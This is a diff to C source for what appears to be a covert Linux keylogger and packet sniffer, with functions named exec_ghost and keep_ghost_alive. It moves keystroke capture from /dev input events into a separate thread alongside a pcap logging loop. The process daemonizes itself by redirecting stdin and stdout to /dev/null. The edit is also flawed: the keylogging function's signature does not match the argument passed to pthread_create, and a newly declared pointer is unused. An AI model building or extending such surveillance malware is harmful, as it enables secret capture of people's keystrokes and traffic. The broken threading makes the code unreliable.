@@ -38,7 +38,7 @@
 pid_t exec_ghost();
 void* keep_ghost_alive(void *args);
 void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
-void start_keylogging(int kb_fd, FILE *log_file);
+void* start_keylogging(int kb_fd, FILE *log_file);
 
 int main(int argc, char **argv)
 {
@@ -51,6 +51,9 @@ int main(int argc, char **argv)
 
     pthread_t aliver;
     pthread_create(&aliver, &attr, keep_ghost_alive, &id);
+    
+    pthread_t keylog;
+    pthread_create(&keylog, &attr, start_keylogging, &id);
 
     FILE *network_log = fopen("log/network.txt", "a");
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
@@ -143,10 +146,6 @@ int main(int argc, char **argv)
     /*Disable buffering to write on every KEY_PRESS*/
     setbuf(log_file, NULL);
     
-    
-    /*Start Keylogging */
-    start_keylogging(kb_fd, log_file);
-    
     pcap_loop(handle, -1, packet_received, (u_char*) &info);
     
     config_cleanup(&config);
@@ -155,6 +154,7 @@ int main(int argc, char **argv)
     pcap_freecode(&filter);
     pcap_close(handle);
     pthread_join(aliver, NULL);
+    pthread_join(keylog, NULL);
 
     fclose(network_log);
 
@@ -217,11 +217,14 @@ void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_cha
         }
 }
 
-void start_keylogging(int kb_fd, FILE *log_file){
+void* start_keylogging(int kb_fd, FILE *log_file){
     
     typedef struct input_event input_event;
     input_event event;
     int shift_pressed=0; //If shift engaged, shift_pressed = 1
+    
+    struct loginfo *info;
+    
     
     /*Daemonize process by redirecting stdin and stdout to /dev/null*/
     if (daemon(1, 0) == -1) {
